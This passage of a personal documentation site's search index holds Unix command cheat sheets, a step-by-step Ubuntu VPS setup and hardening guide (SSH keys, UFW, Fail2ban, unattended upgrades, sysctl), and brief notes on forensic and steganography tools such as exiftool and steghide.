	"content": "tr Usage  Flags  Examples replace lowercase letters with uppercase cat file1 | tr \u0026quot;[a-z]\u0026quot; \u0026quot;[A-Z]\u0026quot; cat file1 | tr \u0026quot;[:lower:]\u0026quot; \u0026quot;[:upper:]\u0026quot;  replace spaces with tabs echo \u0026quot;file1 file2 file3\u0026quot; | tr [:space:] '\\t'  remove specified characters echo 'abcdefg' | tr -d 'a'  remove all the digits from the string echo \u0026quot;123a467b890c\u0026quot; | tr -d [:digit:]  remove all characters except digest echo \u0026quot;123a467b890c\u0026quot; | tr -cd [:digit:]  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/uniq/",
	"title": "uniq",
	"tags": ["Unix Commands"],
	"description": "report or omit repeated lines.",
	"content": "uniq Usage uniq OPTIONS INPUT OUTPUT  Flags -c, --count prefix lines by the number of occurrences -d, --repeated only print duplicate lines, one for each group -D print all duplicate lines --all-repeated[=METHOD] like -D, but allow separating groups with an empty line; METHOD={none(default),prepend,separate} -f, --skip-fields=N avoid comparing the first N fields --group[=METHOD] show all items, separating groups with an empty line; METHOD={separate(default),prepend,append,both} -i, --ignore-case ignore differences in case when comparing -s, --skip-chars=N avoid comparing the first N characters -u, --unique only print unique lines -z, --zero-terminated line delimiter is NUL, not newline -w, --check-chars=N compare no more than N characters in lines --help display this help and exit --version output version information and exit  Examples show each unique line uniq file1  show how many times a line accurse uniq -c file1  only print duplicate lines uniq -D file1  only print non-repetitive lines uniq -u file1  avoid comparing set number of initial characters uniq -s 4 file1  limit comparison to set number of chars uniq -w 3 file1  uniq comparison case insensitive uniq -i file1  uniq output NUL-terminated uniq -z file1  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/commands/unix/xxd/",
	"title": "xxd",
	"tags": ["Unix Commands"],
	"description": "make a hexdump or do the reverse.",
	"content": "xxd Usage xxd OPTIONS INFILE OUTFILE  Flags -a -autoskip toggle autoskip: A single '*' replaces nul-lines. Default off. -b -bits Switch to bits (binary digits) dump, rather than hexdump. This option writes octets as eight digits \u0026quot;1\u0026quot;s and \u0026quot;0\u0026quot;s instead of a normal hexadecimal dump. Each line is preceded by a line number in hexadecimal and followed by an ascii (or ebcdic) representation. The command line switches -r, -p, -i do not work with this mode. -c cols -cols cols format \u0026lt;cols\u0026gt; octets per line. Default 16 (-i: 12, -ps: 30, -b: 6). Max 256. -E -EBCDIC Change the character encoding in the righthand column from ASCII to EBCDIC. This does not change the hexadecimal representation. The option is meaningless in combinations with -r, -p or -i. -g bytes -groupsize bytes separate the output of every \u0026lt;bytes\u0026gt; bytes (two hex characters or eight bit-digits each) by a whitespace. Specify -g 0 to suppress grouping. \u0026lt;Bytes\u0026gt; defaults to 2 in normal mode and 1 in bits mode. Grouping does not apply to postscript or include style. -h -help print a summary of available commands and exit. No hex dumping is performed. -i -include output in C include file style. A complete static array definition is written (named after the input file), unless xxd reads from stdin. -l len -len len stop after writing \u0026lt;len\u0026gt; octets. -p -ps -postscript -plain output in postscript continuous hexdump style. Also known as plain hexdump style. -r -revert reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere. -seek offset When used after -r: revert with \u0026lt;offset\u0026gt; added to file positions found in hexdump. -s [+][-]seek start at \u0026lt;seek\u0026gt; bytes abs. (or rel.) infile offset. + indicates that the seek is relative to the current stdin file position (meaningless when not reading from stdin). - indicates that the seek should be that many characters from the end of the input (or if combined with +: before the current stdin file position). Without -s option, xxd starts at the current file position. -u use upper case hex letters. Default is lower case. -v -version show version string.  Examples Create a hexdump xxd data.txt \u0026gt;\u0026gt; data.hex  Reverse a hexdump xxd -r data.hex \u0026gt;\u0026gt; data.txt  skip to line 0x30 xxd -s 0x30 data.txt 00000030: 6961 7c59 0a0a 3034 7c43 6869 6e61 7c4e ia|Y..04|China|N 00000040: 0a30 357c 5275 7373 6961 7c59 0a30 367c .05|Russia|Y.06| 00000050: 4a61 7061 6e7c 590a 0a30 377c 5369 6e67 Japan|Y..07|Sing 00000060: 7061 6f72 657c 590a 3038 7c53 6f75 7468 paore|Y.08|South 00000070: 204b 6f72 6561 7c4e 0a30 397c 4669 6e61 Korea|N.09|Fina 00000080: 6c61 6e64 7c59 0a31 307c 4972 656c 616e land|Y.10|Irelan 00000090: 647c 590a d|Y.  dump until line x30 xxd -l 0x30 data.txt 00000000: 4e6f 2e7c 436f 756e 7472 797c 5965 732f No.|Country|Yes/ 00000010: 4e6f 0a30 317c 496e 6469 617c 590a 3032 No.01|India|Y.02 00000020: 7c55 537c 590a 3033 7c41 7573 7472 616c |US|Y.03|Austral  set column length xxd -c 5 data.txt 00000000: 4e6f 2e7c 43 No.|C 00000005: 6f75 6e74 72 ountr 0000000a: 797c 5965 73 y|Yes 0000000f: 2f4e 6f0a 30 /No.0 00000014: 317c 496e 64 1|Ind 00000019: 6961 7c59 0a ia|Y. 0000001e: 3032 7c55 53 02|US 00000023: 7c59 0a30 33 |Y.03 00000028: 7c41 7573 74 |Aust 0000002d: 7261 6c69 61 ralia 00000032: 7c59 0a0a 30 |Y..0 00000037: 347c 4368 69 4|Chi 0000003c: 6e61 7c4e 0a na|N. 00000041: 3035 7c52 75 05|Ru 00000046: 7373 6961 7c ssia| 0000004b: 590a 3036 7c Y.06| 00000050: 4a61 7061 6e Japan  Create binary dump xxd -b data.txt  Also see N/A\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/00-intro/",
	"title": "00. Introduction",
	"tags": ["Ubuntu VPS"],
	"description": "Introduction to this guide.",
	"content": "Introduction This guide helps first timers to setup a Ubuntu server through the command-line interface (CLI). This was initially written by a old friend of mine to help me setup my first \u0026lsquo;publicly accessible\u0026rsquo; server. Over the years I build/updated his work and still use it as a reference for a basic baseline when ever I need to setup a VPS. There is a bunch of things you can do yourself to improve, finetune and further secure your VPS, but this should get you at least setup with the (imo) bare minimums.\nThis is also the main reason why this guide its aimed at people who are new to Linux and have little to no experience or sysadmins that have no experience with Linux/Linux headless servers and want to get a server up and running. This is by no means a guide on all you need to know about server management.\nThis guide has last been tested on Ubuntu 18.04LTS.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/01-users/",
	"title": "01. Adding users",
	"tags": ["Ubuntu VPS"],
	"description": "Adding users using the commandline.",
	"content": "Adding users Most likely if you are setting up a VPS with a cloud provider they gave you access to the machine with the root account. Using the root account for daily tasks is against best practices, so first things first, lets create a additional account for daily administrator tasks. If you are installing in VM you most likely already setup a additional account during the installation, if so you can skip to the next page.\nIn this guide we will be using a account named beheer. This is interchangeable between systems. I\u0026rsquo;d recommend choosing something that you like.\nTo setup this user follow the instructions below:\n Create new user with adduser beheer Change user to your new one to check whether it works su beheer Try doing something you should not be able to do, like apt-get install ncdu. You will probably see a Error message. This is because this user account currently does not have rights to run this command. This is because this user has not been added to the sudoers group. Go back to root exit Add the user to sudoers sudo adduser beheer sudo Try switching to the user and see if you are now able to install something.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/02-packges/",
	"title": "02. Managing of packages",
	"tags": ["Ubuntu VPS"],
	"description": "Managing packages using the commandline.",
	"content": "Managing of packages Nearly all Linux distributions come preinstalled with a packet manager. A packet manager is an application that pulls software packages from a software library and installs them on the system.\nWhy a package manager is awesome If you want to install a web server on Windows, you will first need to manually perform several steps to download the installer and install it on your system.\nOn Linux (Ubuntu in this example), only a simple command is required: apt install nginx. The package manager (APT) makes sure that nginx gets downloaded from a trusted source and is properly installed on your system.\nAPT also has many other functionalities, like:\n Searching for available software packages in all software libraries. Updating old software packages. Updating your operating system (system upgrade).  Warning: On older Linux versions, you are possible required to extend the apt command to apt-get.\nExamples of using apt Performing updates on all installed packages apt update \u0026amp;\u0026amp; apt upgrade\nSearching for a package called nginx in the package library apt search nginx\nUseful packages Below are several packages that will make your life managing a server much more easy. I recommended to install these applications on every server by default.\napt install htop ranger tmux ncdu\nAlso see  HTOP explained visually Check disk space usage on linux using ncdu Official Ranger user guide A quick and easy guide to tmux Tmux Cheatsheet  "
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/03-vim/",
	"title": "03. File editor: vim",
	"tags": ["Ubuntu VPS"],
	"description": "Editing files using the commandline.",
	"content": "File editor: vim Vim is a command-line text editor. Vim is entirely controlled with keyboard input, so it requires some time to get used to, but doing so will give you some hair on your chest.\nVim knows two important modes, the command-mode and the input-mode. The first one is used to enter commands. The second one is used to edit the opened file. To get you started some basic vim actions have been described below.\nOpening a file using vim: vim fileyouwanttoedit.cfg\nSwitching modes  You can enter input-mode by pressing the i key on your keyboard. You can go to the command-mode by pressing the ESC key on your keyboard.  Exiting Vim without saving  Pressing the ESC key Entering :q! Pressing the ENTER key  Exiting Vim with saving  Pressing the ESC key Entering :wq! or :x! Pressing the ENTER key  Saving file in vim  Pressing the ESC key Entering :w! Pressing the ENTER key  "
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/04-ufw/",
	"title": "04. UFW",
	"tags": ["Ubuntu VPS"],
	"description": "Setting up a basic firewall files using the commandline.",
	"content": "UFW UFW stands for uncomplicated firewall. UFW actually is not a firewall itself, instead it is a configuration program for iptables.\nFirst of all, make sure that UFW is installed on the server with the following command: sudo apt install ufw\nDefault settings In the most cases firewalls are configured to block all incoming traffic and allow all outgoing traffic by default. If this is your first time i\u0026rsquo;d recommend configuring it like just like that. Todo this run the following 2 commands:\nsudo ufw default deny incoming\nsudo ufw default allow outgoing\nSome allow rules Now that we blocked all incoming traffic we should ensure that where still able to manage this machine after enabling the firewall. This means we need to allow SSH. In most cases, HTTP and HTTPS traffic is crucial as well. You can allow these 3 services by running the commands below.\nsudo ufw allow ssh\nsudo ufw allow http\nsudo ufw allow https\nEnable UFW Now we need to make sure we enable the firewall. Todo so this run sudo ufw enable\nAfterwords you can check your config by running sudo ufw status verbose\nAlso see For more information on UFW and on how to use it see the following pages:\n UFW Essentials How to setup a firewall with ufw Advanced UFW setups  "
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/05-ssh-keys/",
	"title": "05. SSH Keys",
	"tags": ["Ubuntu VPS"],
	"description": "Generating and setting up SSH Keys.",
	"content": "SSH Keys SSH keys allow you to connect to servers with a secret key AND password. If configured correctly, without the key a person would not be able to authenticate itself through SSH, even if it somehow got possession of your a user accounts password.\nGenerating and using SSH keys As a example in this guide we will use PuTTY for generating and using SSH keys. If you do not have PuTTY installed on your own system and want to follow along, click here to download it.\nIf you do have PuTTY installed, make sure PuTTYgen is installed as well.\nWe will use PuTTYgen to generate the keypair. Start up PuTTYgen and press the Generate button.\nMove your mouse over the Key area untill the progress bar it is completely filled up. PuTTYgen uses the mouse movements to collect randomness.\nWhen complete, the public key should appear in the Window. You can now specify a passphrase for the key. I recommended using a passphrase for private key files intended for interactive use.\nSave your private key on your own system by pressing the Save private key button within PuTTYgen. The private key should be kept to yourself and is used to authenticate yourself against the public key that we placed on the server.\nave your private key on your own system by pressing the Save private key button within PuTTYgen. This text will be added to a SSH authorized_keys file on servers that you want to use this Public-Private key paring on.\nNow you need to add this key paring on your server. Todo so login on your Linux server and run the the following commands:\nmkdir ~/.ssh chmod 0700 ~/.ssh touch ~/.ssh/authorized_keys chmod 0644 ~/.ssh/authorized_keys  Then edit file ~/.ssh/authorized_keys using the following command:\nsudo vim ~/.ssh/authorized_keys\nPress the i key on your keyboard once to enter input-mode within vim. Paste the public key in this file. Save the file by pressing ESC, then typing :wq! and pressing ENTER.\nTo ensure everything is setup correctly you can run the commands below to adjust the file owner, permissions and group on the .ssh folder and authorized_keys file.\nchown beheer:beheer ~/.ssh -R chmod 0700 ~/.ssh chmod 0644 ~/.ssh/authorized_keys  Also see  Understanding public key private key concepts  "
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/06-setup-sshd/",
	"title": "06. Setup sshd",
	"tags": ["Ubuntu VPS"],
	"description": "Hardening the SSH Deamon.",
	"content": "Setup sshd Only give access to specific users and groups You can tell your server which users are allowed to connect to your server through SSH and who are not. You can do this with the the AllowUsers keyword in the SSHD configuration file.Todo so, edit the configuration file (/etc/ssh/sshd_config). The same can be done for groups using the AllowGroups keyword.\nIn the example below we tell our system that only the user beheer is allowed to authenticate using SSH.\nAllowUsers beheer\nDo not allow the user root to access the server over SSH The root is the a account that has all the permissions on the system, if someone with bad intentions is able to logon with root its game-over. In the SSH-configuration file there is a options to enable/disable root logon. You will see the following rule/line: PermitRootLogin value\nMake sure to adjust it to the following: PermitRootLogin no\nOnly allow authentication with private keys To further secure the server we are going to only allow SSH logins on the server with SSH keys.\nPubkeyAuthentication yes PasswordAuthentication no  In order to process the made changes we need to restart the ssh deamon. You can use the following command todo so: sudo service sshd restart\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/07-unattended-upgrades/",
	"title": "07. Unattended Upgrades",
	"tags": ["Ubuntu VPS"],
	"description": "Automating security updates and reboots.",
	"content": "Unattended Upgrades Updates are important. But where all lazy, so we want to automate some of this process. To ensure our server is always using the latest important security updates we are going to configure Unattended upgrades.\nNormally this is installed by default, but some hosting providers might use custom images which strip some packages from the default installation.\nInstall unattended-upgrades sudo apt-get install unattended-upgrades sudo dpkg-reconfigure -plow unattended-upgrades  Configure unattended-upgrades sudo vim /etc/apt/apt.conf.d/50unattended-upgrades\nAuto reboot Some updates require a restart after installing, kernel updates being one of them. On ubuntu if you don\u0026rsquo;t reboot the server the new kernel will not be loaded. To ensure you are running on the latest kernel version you can configure unattended-upgrades to auto reboot at a specific time.\n// Automatically reboot *WITHOUT CONFIRMATION* // if the file /var/run/reboot-required is found after the upgrade Unattended-Upgrade::Automatic-Reboot \u0026quot;true\u0026quot;; // If automatic reboot is enabled and needed, reboot at the specific // time instead of immediately // Default: \u0026quot;now\u0026quot; Unattended-Upgrade::Automatic-Reboot-Time \u0026quot;04:00\u0026quot;;  Mail The file 50unattended-upgrades can be manually adjusted to send mails if unattended upgrades fail on the server.\n// Send email to this address for problems or packages upgrades // If empty or unset then no email is sent, make sure that you // have a working mail setup on your system. A package that provides // 'mailx' must be installed. E.g. \u0026quot;user@example.com\u0026quot; Unattended-Upgrade::Mail \u0026quot;user@example.com\u0026quot;; // Set this value to \u0026quot;true\u0026quot; to get emails only on errors. Default // is to always send a mail if Unattended-Upgrade::Mail is set Unattended-Upgrade::MailOnlyOnError \u0026quot;true\u0026quot;;  It is likely that the e-mails sent from the server are getting blocked by spamfilters. Make sure to have a public A-record for your FQDN. Also check your spam filter and/or configure things like MX, SPF, DKIM and DMARC.\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/08-fail2ban/",
	"title": "08. Fail2ban",
	"tags": ["Ubuntu VPS"],
	"description": "Setting up a Fail2Ban, a package that will automatically ban brute forcing IPs.",
	"content": "Fail2Ban If you ever connected something to the public internet you might have noticed that within seconds people are knocking on your ports. To avoid people bruteforcing them self into your server you can setup Fail2Ban. Fail2Ban watches logfiles for incorrect logins and automatically bans IP\u0026rsquo;s.\nInstalling Fail2Ban sudo apt update \u0026amp;\u0026amp; sudo apt upgrade sudo apt install fail2ban  Make sure you copy the default Fail2Ban configuration file to jail.local. Never edit the file jail.conf.\nsudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local\nsudo vim /etc/fail2ban/jail.local\nSetup IP exclusions You can configure Fail2Ban to exclude some IPs. You might want to add your own external IP here. Fail2Ban uses CIDR notations.\nignoreip = 127.0.0.1/8 an.ip.address.here another.goes.here.yeah one.for.another.person\nSetup for how long a IP will be banned You can configure Fail2Ban how long IPs are banned. IF you excluded your own external IP i\u0026rsquo;d recommend setting up permanent bans.\nuse bantime = -1 for permanent bans, otherwise use bantime = 21600\nApply settings Restart Fail2Ban with the command: sudo service fail2ban restart\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/09-logwatch/",
	"title": "09. Logwatch",
	"tags": ["Ubuntu VPS"],
	"description": "Setting up Logwatch, a package that parses logs files on your system and sends over a report.",
	"content": "Logwatch Logwatch is a package that parses logs files on your system and sends over a report. This is a useful way to monitor whats going on and ensure you can spot issues more timely and easily.\nUpdate and upgrade your packges sudo apt update \u0026amp;\u0026amp; sudo apt upgrade\nInstalling Logwatch sudo apt install logwatch\nConfiguring Logwatch default.conf/logwatch.conf sudo vim /usr/share/logwatch/default.conf/logwatch.conf\nI\u0026rsquo;d recommend setting following parameters as below:\nOutput = mail Format = html MailTo = support@domain.tld MailFrom = logwatch@fqdn-of-the-server-here Range = Today Detail = 10 Service = All  dist.conf/logwatch.conf sudo vim /usr/share/logwatch/dist.conf/logwatch.conf\nI\u0026rsquo;d recommend setting following parameters as below:\nMailFrom = logwatch@fqdn-of-the-server-here\nmain.cf sudo vim /etc/postfix/main.cf\nI\u0026rsquo;d recommend setting following parameters as below:\nmydestination = $myhostname, FQDN of the server here, localhost.localdomain, localhost\nTesting Logwatch logwatch --mailto your-email@domain.tld\nIt is likely that the e-mails sent from the server are getting blocked by spamfilters. Make sure to have a public A-record for your FQDN. Also check your spam filter and/or configure things like MX, SPF, DKIM and\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/guides/ubuntu-vps/10-sysctl-optimization/",
	"title": "10. Sysctl Optimization",
	"tags": ["Ubuntu VPS"],
	"description": "Linux sysctl.conf parameter tweaking to improve memory management, network security, network performance.",
	"content": "Sysctl Optimization Linux sysctl.conf parameter tweaking to improve memory management, network security, network performance.\nConfiguration Open /etc/sysctl.conf in an editor\nsudo vim /etc/sysctl.conf\nAdd the following lines to the end of the file:\n# Do not accept ICMP redirects (prevent MITM attacks) net.ipv4.conf.all.accept_redirects = 0 net.ipv6.conf.all.accept_redirects = 0 # Do not send ICMP redirects (we are not a router) net.ipv4.conf.all.send_redirects = 0 # Log Martian Packets net.ipv4.conf.all.log_martians = 1 # Controls IP packet forwarding net.ipv4.ip_forward = 0 # Controls source route verification net.ipv4.conf.default.rp_filter = 1 # Do not accept source routing net.ipv4.conf.default.accept_source_route = 0 # Controls the System Request debugging functionality of the kernel kernel.sysrq = 0 # Controls whether core dumps will append the PID to the core filename # Useful for debugging multi-threaded applications kernel.core_uses_pid = 1 # Controls the use of TCP syncookies net.ipv4.tcp_synack_retries = 2 ######## IPv4 networking start ########### # Send redirects, if router, but this is just server net.ipv4.conf.all.send_redirects = 0 net.ipv4.conf.default.send_redirects = 0 # Accept packets with SRR option? No net.ipv4.conf.all.accept_source_route = 0 # Accept Redirects? No, this is not router net.ipv4.conf.all.accept_redirects = 0 net.ipv4.conf.all.secure_redirects = 0 # Log packets with impossible addresses to kernel log? Yes net.ipv4.conf.all.log_martians = 1 net.ipv4.conf.default.accept_source_route = 0 net.ipv4.conf.default.accept_redirects = 0 net.ipv4.conf.default.secure_redirects = 0 # Ignore all ICMP ECHO and TIMESTAMP requests sent to it via broadcast/multicast net.ipv4.icmp_echo_ignore_broadcasts = 1 # Prevent against the common 'syn flood attack' net.ipv4.tcp_syncookies = 1 # Enable source validation by reversed path, as specified in RFC1812 net.ipv4.conf.all.rp_filter = 1 net.ipv4.conf.default.rp_filter = 1 ######## IPv6 networking start ########### # Number of Router Solicitations to send until assuming no routers are present. # This is host and not router net.ipv6.conf.default.router_solicitations = 0 # Accept Router Preference in RA? net.ipv6.conf.default.accept_ra_rtr_pref = 0 # Learn Prefix Information in Router Advertisement net.ipv6.conf.default.accept_ra_pinfo = 0 # Setting controls whether the system will accept Hop Limit settings from a router advertisement net.ipv6.conf.default.accept_ra_defrtr = 0 #router advertisements can cause the system to assign a global unicast address to an interface net.ipv6.conf.default.autoconf = 0 #how many neighbor solicitations to send out per address? net.ipv6.conf.default.dad_transmits = 0 # How many global unicast IPv6 addresses can be assigned to each interface? net.ipv6.conf.default.max_addresses = 1 ######## IPv6 networking ends ########### # Disabled, not used anymore #Enable ExecShield protection | #kernel.exec-shield = 1 #kernel.randomize_va_space = 1 # TCP and memory optimization # increase TCP max buffer size setable using setsockopt() #net.ipv4.tcp_rmem = 4096 87380 8388608 #net.ipv4.tcp_wmem = 4096 87380 8388608 # increase Linux auto tuning TCP buffer limits #net.core.rmem_max = 8388608 #net.core.wmem_max = 8388608 #net.core.netdev_max_backlog = 5000 #net.ipv4.tcp_window_scaling = 1 # increase system file descriptor limit fs.file-max = 65535 #Allow for more PIDs kernel.pid_max = 65536 #Increase system IP port limits net.ipv4.ip_local_port_range = 2000 65000 # Disable IPv6 autoconf #net.ipv6.conf.all.autoconf = 0 #net.ipv6.conf.default.autoconf = 0 #net.ipv6.conf.eth0.autoconf = 0 #net.ipv6.conf.all.accept_ra = 0 #net.ipv6.conf.default.accept_ra = 0 #net.ipv6.conf.eth0.accept_ra = 0  Save the configuration file and process the changes using the command below\nsudo sysctl -p\n"
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/ubuntu-vps/",
	"title": "Ubuntu VPS",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-steganography/binwalk/",
	"title": "binwalk",
	"tags": ["Steganography"],
	"description": "binwalk description.",
	"content": "binwalk Binwalk is a tool for searching binary files like images and audio files for embedded files and data.\nbinwalk file  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-forensic/exiftool/",
	"title": "exiftool",
	"tags": ["Forensic"],
	"description": "exiftool description.",
	"content": "exiftool Usage exiftool OPTIONS FILE  Flags Tag operations -TAG or --TAG Extract or exclude specified tag -TAG[+-]=[VALUE] Write new value for tag -TAG[+-]\u0026lt;=DATFILE Write tag value from contents of file -TAG[+-]\u0026lt;SRCTAG Copy tag value (see -tagsFromFile) -tagsFromFile SRCFILE Copy tag values from file -x TAG (-exclude) Exclude specified tag Input-output text formatting -args (-argFormat) Output data as exiftool arguments -b (-binary) Output data in binary format -c FMT (-coordFormat) Set format for GPS coordinates -charset [[TYPE=]CHARSET] Specify encoding for special characters -d FMT (-dateFormat) Set format for date/time values -D (-decimal) Show tag ID numbers in decimal -E, -ex (-escape(HTML|XML)) Escape values for HTML (-E) or XML (-ex) -f (-forcePrint) Force printing of all specified tags -g[NUM...] (-groupHeadings) Organize output by tag group -G[NUM...] (-groupNames) Print group name for each tag -h (-htmlFormat) Use HMTL formatting for output -H (-hex) Show tag ID number in hexadecimal -htmlDump[OFFSET] Generate HTML-format binary dump -j (-json) Use JSON output format -l (-long) Use long 2-line output format -L (-latin) Use Windows Latin1 encoding -lang [LANG] Set current language -n (--printConv) Disable print conversion -p FMTFILE (-printFormat) Print output in specified format -s (-short) Short output format -S (-veryShort) Very short output format -sep STR (-separator) Set separator string for list items -struct Enable output of structured information -t (-tab) Output in tab-delimited list format -T (-table) Output in tabular format -v[NUM] (-verbose) Print verbose messages -w[!] EXT (-textOut) Write output text files -X (-xmlFormat) Use RDF/XML output format Processing control -a (-duplicates) Allow duplicate tags to be extracted -e (--composite) Do not calculate composite tags -ee (-extractEmbedded) Extract information from embedded files -ext EXT (-extension) Process files with specified extension -F[OFFSET] (-fixBase) Fix the base for maker notes offsets -fast[NUM] Increase speed for slow devices -fileOrder [-]TAG Set file processing order -i DIR (-ignore) Ignore specified directory name -if EXPR Conditionally process files -m (-ignoreMinorErrors) Ignore minor errors and warnings -o OUTFILE (-out) Set output file or directory name -overwrite_original Overwrite original by renaming tmp file -overwrite_original_in_place Overwrite original by copying tmp file -P (-preserve) Preserve date/time of original file -password PASSWD Password for processing protected files -q (-quiet) Quiet processing -r (-recurse) Recursively process subdirectories -scanForXMP Brute force XMP scan -u (-unknown) Extract unknown tags -U (-unknown2) Extract unknown binary tags too -z (-zip) Read/write compressed information Special features -geotag TRKFILE Geotag images from specified GPS log -use MODULE Add features from plug-in module Utilities -delete_original[!] Delete \u0026quot;_original\u0026quot; backups -restore_original Restore from \u0026quot;_original\u0026quot; backups Other options -@ ARGFILE Read command-line arguments from file -k (-pause) Pause before terminating -list[w|f|wf|g[NUM]|d|x] List various exiftool attributes -ver Print exiftool version number Advanced options -common_args Define common arguments -config CFGFILE Specify configuration file name -execute Execute multiple commands on one line -srcfile FMT Set different source file name -stay_open FLAG Keep reading -@ argfile even after EOF  Examples Searching for Files Find images in a directory that don\u0026rsquo;t have a DateTimeOriginal exiftool -filename -filemodifydate -createdate -r -if '(not $datetimeoriginal) and $filetype eq \u0026quot;JPEG\u0026quot;' .  See files File Modify Date recursively in a directory who don\u0026rsquo;t have datetimeoriginal set exiftool -filemodifydate -r -if '(not $datetimeoriginal or ($datetimeoriginal eq \u0026quot;0000:00:00 00:00:00\u0026quot;)) and ($filetype eq \u0026quot;JPEG\u0026quot;)' .  Modifying Files Create Captions From a Filename exiftool '-Comment\u0026lt;BaseName' '-UserComment\u0026lt;BaseName' .  Change JPG to jpg and MOV to mov in filenames for i in *.JPG; do mv \u0026quot;$i\u0026quot; \u0026quot;${i%%.JPG}.jpg\u0026quot;; done; !#:gs/JPG/MOV/:gs/jpg/mov/  Recursively\nfind /path/to/directory -name *JPG -exec sh -c 'mv \u0026quot;$0\u0026quot; \u0026quot;${0%%.JPG}.jpg\u0026quot;; echo \u0026quot;Moved $0 to ${0%%.JPG}.jpg\u0026quot;' {} \\;  Change last created and modified for files in a directory The date syntax has to be YYYY:MM:DD HH:MM:SS\nOption 1:\nfind . -name \u0026quot;*.jpg\u0026quot; | while read filename; exiftool \u0026quot;-AllDates=1986:11:05 12:00:00\u0026quot; \u0026quot;$filename\u0026quot;; done  Option 2:\nexiftool \u0026quot;-AllDates=1986:11:05 12:00:00\u0026quot; -if '$filetype eq \u0026quot;JPEG\u0026quot;' .  Timeshift Photos by One Year exiftool \u0026quot;-AllDates+=1:0:0 0\u0026quot; .  Rename files to datestamp Filename looks like 2014-01-01 12:00:00.jpg and will append -NUM if DateTimeOriginal is the same for multiple files\nexiftool '-FileName\u0026lt;DateTimeOriginal' -d \u0026quot;%Y-%m-%d %H.%M.%S%%-c.%%e\u0026quot; .  Rename Files to With Milliseconds Good for burst photos where the seconds are all the same. If milliseconds are only out to 2 digits, use ${SubSecCreateDate} instead\nFound at\nexiftool -v '-Filename\u0026lt;${datetimeoriginal}${subsectimeoriginal;$_.=0 x(3-length)}.%e' -d %Y%m%d_%H%M%S .  Update any photo that doesn\u0026rsquo;t have DateTimeOriginal to have it based on file modify date exiftool '-datetimeoriginal\u0026lt;filemodifydate' -if '(not $datetimeoriginal or ($datetimeoriginal eq \u0026quot;0000:00:00 00:00:00\u0026quot;)) and ($filetype eq \u0026quot;JPEG\u0026quot;)' .  Set DateTimeOriginal to Any Arbitrary Timestamp exiftool '-datetimeoriginal=2015:01:18 12:00:00' .  Moving/Copying Files Copy directory recursively into organized folder exiftool -o ~/dummy/ -if '$filesize# \u0026gt; 300000' '-Directory\u0026lt;CreateDate' -d ~/Desktop/old_photos2/%Y/%m\\ %B -r ~/Desktop/iPhoto\\ Library/  -o ~/dummy This flag is to copy, not move. The directory is a fallback if the flag isn\u0026rsquo;t available on the given photo. Good if using something like DateTimeOriginal\n-if '$filesize# \u0026gt; 300000' gets files that are over 300kB. I was parsing an iPhoto library where there were thumbnails. The # turns the value to a number. you can use the flag -n to turn all values to numbers\n'-Directory\u0026lt;CreateDate' Create directories based on the CreateDate of the photos\n-d ~/Desktop/old_photos/%Y/%m\\ %B Create folders with the given date format.\n-r Run recursively\nAlso see  Cheatsheet source Timeshift Photos by One Year Rename Files to With Milliseconds  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/forensic/",
	"title": "Forensic",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-forensic/ssh-sha256-to-public-key/",
	"title": "ssh sha256 to public key",
	"tags": ["Forensic"],
	"description": "ssh sha256 to public key description.",
	"content": "ssh sha256 to public key Accepted publickey for beheer from 10.0.0.1 port 17073 ssh2: RSA SHA256:13456798132456789123  ssh-keygen -lf ~/.ssh/authorized_keys 9999 SHA256:13456798132456789123 JustinPerdok@some-PC (RSA)  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tags/steganography/",
	"title": "Steganography",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-steganography/steghide/",
	"title": "steghide",
	"tags": ["Steganography"],
	"description": "steghide description.",
	"content": "steghide get info root@kali:/mnt/hgfs/_shared_folder# steghide info hawking \u0026quot;hawking\u0026quot;: format: jpeg capacity: 3.3 KB Try to get information about embedded data ? (y/n) y Enter passphrase: embedded file \u0026quot;flag.txt\u0026quot;: size: 1.6 KB encrypted: rijndael-128, cbc compressed: yes  extract data root@kali:/mnt/hgfs/_shared_folder# steghide --extract -sf hawking -p hawking wrote extracted data to \u0026quot;flag.txt\u0026quot;.  "
},
{
	"uri": "https://dev-hugo.justin-p.me/tools/00-forensic/usbrip/",
	"title": "usbrip",
	"tags": ["Forensic"],
	"description": "usbrip description.",
